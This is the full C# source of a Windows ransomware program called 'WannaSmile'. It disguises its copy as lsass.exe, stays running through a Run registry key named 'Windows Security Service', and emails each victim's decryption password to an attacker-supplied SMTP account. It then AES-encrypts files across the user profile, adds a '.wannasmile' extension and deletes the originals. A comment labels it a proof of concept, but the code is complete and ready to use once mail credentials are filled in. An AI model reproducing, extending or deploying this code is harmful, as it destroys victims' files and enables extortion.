using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Net.Mail;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;

namespace WannaSmile
{
    static class Program
    {
        public static string szID, szHash;   
		
        public const string exename = "Windows Security Service"; //Payload Executable Name for Trojan
		
		
        public const string szTargetMail = "###### your target email  #######"; // Target mail can be the same as sender_Mail if you dont want to use two mail accounts
		
		//Mail credentials of Mailing Server
		public const string sender_Mail = "###### your sender mail  #######";
		public const string sender_Password = "###### your sender mail password  #######";
		
        public const string szExtension = ".wannasmile";
		public const int smtp_port = 587; //smtp port of the mailing server
		public const string smtp_server = "###### your server  #######";
		
        private const long iFileLen = 20000000;

        //Getting Wannasmile data path 
		// After first execution, this file is created there and it contains user unique id, decryption password's hash
        public static string get_data_path()
        {
            string path;
            path = "%AppData%\\wns_data.wns";
            path = Environment.ExpandEnvironmentVariables(path);
            return path;
        }

        //Getting User Profile Path
        public static string get_user_path()
        {          
            return Environment.ExpandEnvironmentVariables("%userprofile%");
        }

        //Getting Trojan Copy Path
        public static string copy_path()
        {
            string path;
            path = "%AppData%\\lsass.exe";
            path = Environment.ExpandEnvironmentVariables(path);
            return path;
        }

		//Encryption all user's data
        private static void EncryptFiles()
        {
            szID = Crypto.hash.GeneratePassword(lengthOfPassword: 16);
            Thread.Sleep(50);
            string wnss = Crypto.hash.GeneratePassword();
            szHash = Crypto.hash.GetHash(wnss);
            using (StreamWriter writer = File.CreateText(get_data_path()))
             {
                 writer.WriteLine(szID);
                 writer.WriteLine(szHash);
				 
				 /*     Careful HERE !!!
				        The line below is trivial here. It is not used by the program but it's intended for debugging purposes.
						In case the password fails to be sent via email, you will have a backup copy of it in the wns_data file's last line.
						This is a proof of concept, so you have no reason to delete the line below as it doesn't change the malware's behaviour.
				 */
                 writer.WriteLine(wnss);
            }

            //Send mail to youself       
            
            MailMessage mail = new MailMessage(sender_Mail, szTargetMail);
            SmtpClient client = new SmtpClient();
            client.Port = smtp_port;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;      
            client.Host = smtp_server;
            client.EnableSsl = true;
            client.UseDefaultCredentials = false;
            client.Credentials = new System.Net.NetworkCredential(sender_Mail, sender_Password);
            mail.Subject = "New User " + szID; ;
            mail.Body = "User: " + szID + "<br>Pass: " + wnss;
            mail.BodyEncoding = Encoding.UTF8;         
            mail.IsBodyHtml = true;
            mail.Priority = MailPriority.Normal;
            mail.SubjectEncoding = Encoding.UTF8;

            client.Send(mail);
            client.Dispose();
         
                  
            var files = FindSupportedFiles(get_user_path());

            string fname;
            byte[] pass = Encoding.ASCII.GetBytes(wnss);

            string wallpaper = Registry.GetValue(@"HKEY_CURRENT_USER\Control Panel\Desktop", "WallPaper", 0).ToString();

            foreach (string s in files)
            {
                if (s.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) || s.EndsWith(".ini", StringComparison.OrdinalIgnoreCase)  || s.EndsWith(".wns", StringComparison.OrdinalIgnoreCase) || s.EndsWith(szExtension, StringComparison.OrdinalIgnoreCase))
                    continue;

                if ((new FileInfo(s).Length > iFileLen) || (s == wallpaper))
                    continue;

                fname = s + szExtension;
                if (!Crypto.hash.AES_Encrypt(s, fname, pass))
                    continue;
                try { File.Delete(s);  }
                catch { continue; }
            }
            

        }

        public static List<string> FindSupportedFiles(string root)
        {
            if (root == null) { throw new ArgumentNullException("root"); }
            if (string.IsNullOrWhiteSpace(root)) { throw new ArgumentException("The passed value may not be empty or whithespace", "root"); }

            var files = new List<string>();


            var rootDirectory = new DirectoryInfo(root);
            if (rootDirectory.Exists == false) { return files; }

            root = rootDirectory.FullName;

            var folders = new Queue<string>();
            folders.Enqueue(root);
            while (folders.Count != 0)
            {
                string currentFolder = folders.Dequeue();

                try
                {
                    var currentFiles = Directory.EnumerateFiles(currentFolder, "*.*");
                    files.AddRange(currentFiles);
                }
                
                catch (UnauthorizedAccessException) { }
                catch (PathTooLongException) { }

                try
                {
                    var currentSubFolders = Directory.GetDirectories(currentFolder);
                    foreach (string current in currentSubFolders)
                    {
                        folders.Enqueue(current);
                    }
                }
               
                catch (UnauthorizedAccessException) { }
                catch (PathTooLongException) { }

            }
            return files;
        }

        public static void SelfDestruct()
        {
            if (File.Exists(copy_path()))
            {
                File.SetAttributes(copy_path(), FileAttributes.Normal);
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + copy_path() + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (rk.GetValue(exename) != null)
                rk.DeleteValue(exename);
        }

        [STAThread]
        static void Main()
        {
            GC.KeepAlive(szID);
            GC.KeepAlive(exename);
            GC.KeepAlive(szTargetMail);
            GC.KeepAlive(szHash);
            GC.KeepAlive(szExtension);
            GC.KeepAlive(iFileLen);

            if (!File.Exists(copy_path()))
            {
                string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                File.Copy(src, copy_path());
                File.SetAttributes(copy_path(), FileAttributes.Hidden);
            }

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); 
            
            if(rk.GetValue(exename) == null)
                rk.SetValue(exename, copy_path());

            if (!File.Exists(get_data_path()))
            {
                EncryptFiles();
                GC.Collect();
            }
            else
            {
                using (StreamReader sr = new StreamReader(get_data_path()))
                {
                    szID = sr.ReadLine();
                    szHash = sr.ReadLine();
                }
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}


namespace Crypto
{
    public static class hash
    {
        public static bool AES_Encrypt(string inputFile, string outputFile, byte[] passwordBytes)
        {
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            string cryptFile = outputFile;
            FileStream fsCrypt;
            try { fsCrypt = new FileStream(cryptFile, FileMode.Create); }
            catch { return false; }

            RijndaelManaged AES = new RijndaelManaged();

            AES.KeySize = 256;
            AES.BlockSize = 128;


            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;

            AES.Mode = CipherMode.CBC;

            CryptoStream cs = new CryptoStream(fsCrypt,
                 AES.CreateEncryptor(),
                CryptoStreamMode.Write);

            FileStream fsIn;

            try { fsIn = new FileStream(inputFile, FileMode.Open); }
            catch { return false; }
            

            int data;
            while ((data = fsIn.ReadByte()) != -1)
                cs.WriteByte((byte)data);


            fsIn.Close();
            cs.Close();
            fsCrypt.Close();

            return true;

        }

        public static bool AES_Decrypt(string inputFile, string outputFile, byte[] passwordBytes)
        {

            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            FileStream fsCrypt;

            try { fsCrypt = new FileStream(inputFile, FileMode.Open); }
            catch { return false; }

            RijndaelManaged AES = new RijndaelManaged();

            AES.KeySize = 256;
            AES.BlockSize = 128;


            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;

            AES.Mode = CipherMode.CBC;

            CryptoStream cs = new CryptoStream(fsCrypt,
                AES.CreateDecryptor(),
                CryptoStreamMode.Read);

            FileStream fsOut;

            try { fsOut = new FileStream(outputFile, FileMode.Create); }
            catch { return false; }

            int data;
            while ((data = cs.ReadByte()) != -1)
                fsOut.WriteByte((byte)data);

            fsOut.Close();
            cs.Close();
            fsCrypt.Close();

            return true;
        }
    

    public static string GetHash(string input)
        {
            SHA256 str = SHA256.Create();

            byte[] data = str.ComputeHash(Encoding.UTF8.GetBytes(input));

            var sBuilder = new StringBuilder();
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }
            return sBuilder.ToString();
        }

        public static bool VerifyHash(string input, string hash)
        {
            var hashOfInput = GetHash(input);
            StringComparer comparer = StringComparer.OrdinalIgnoreCase;
            return comparer.Compare(hashOfInput, hash) == 0;
        }

        public static string GeneratePassword(bool includeLowercase = true, bool includeUppercase = true, bool includeNumeric = true, bool includeSpecial = true, bool includeSpaces = false, int lengthOfPassword = 32)
        {
            const int MAXIMUM_IDENTICAL_CONSECUTIVE_CHARS = 2;
            const string LOWERCASE_CHARACTERS = "abcdefghijklmnopqrstuvwxyz";
            const string UPPERCASE_CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string NUMERIC_CHARACTERS = "0123456789";
            const string SPECIAL_CHARACTERS = @"!#$*@";
            const string SPACE_CHARACTER = " ";
            const int PASSWORD_LENGTH_MIN = 8;
            const int PASSWORD_LENGTH_MAX = 128;

            if (lengthOfPassword < PASSWORD_LENGTH_MIN || lengthOfPassword > PASSWORD_LENGTH_MAX)
            {
                return "Password length must be between 8 and 128.";
            }

            string characterSet = "";

            if (includeLowercase)
            {
                characterSet += LOWERCASE_CHARACTERS;
            }

            if (includeUppercase)
            {
                characterSet += UPPERCASE_CHARACTERS;
            }

            if (includeNumeric)
            {
                characterSet += NUMERIC_CHARACTERS;
            }

            if (includeSpecial)
            {
                characterSet += SPECIAL_CHARACTERS;
            }

            if (includeSpaces)
            {
                characterSet += SPACE_CHARACTER;
            }

            char[] password = new char[lengthOfPassword];
            int characterSetLength = characterSet.Length;

            System.Random random = new System.Random();
            for (int characterPosition = 0; characterPosition < lengthOfPassword; characterPosition++)
            {
                password[characterPosition] = characterSet[random.Next(characterSetLength - 1)];

                bool moreThanTwoIdenticalInARow =
                    characterPosition > MAXIMUM_IDENTICAL_CONSECUTIVE_CHARS
                    && password[characterPosition] == password[characterPosition - 1]
                    && password[characterPosition - 1] == password[characterPosition - 2];

                if (moreThanTwoIdenticalInARow)
                {
                    characterPosition--;
                }
            }

            return string.Join(null, password);
        }
       
    }
}
